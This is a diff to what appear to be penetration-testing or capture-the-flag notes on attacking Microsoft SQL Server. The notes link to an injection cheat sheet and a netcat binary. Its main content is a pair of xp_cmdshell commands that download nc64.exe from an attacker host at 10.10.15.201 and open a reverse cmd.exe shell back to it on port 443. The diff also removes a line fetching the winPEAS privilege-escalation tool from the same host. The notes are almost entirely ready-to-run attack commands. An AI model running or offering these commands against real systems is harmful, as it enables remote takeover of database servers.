@@ -32,16 +32,7 @@ https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sh
 https://github.com/int0x33/nc.exe/blob/master/nc64.exe
 
 xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.15.201/nc64.exe -outfile nc64.exe"
-xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.15.201 443
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.15.201 443"
 
 ## Tips
 * Try -windows-auth to use Windows Authentication
-
-
-
-
-
-
-
-
-wget http://10.10.15.201/winPEASx64.exe -outfile winPEASx64.exe
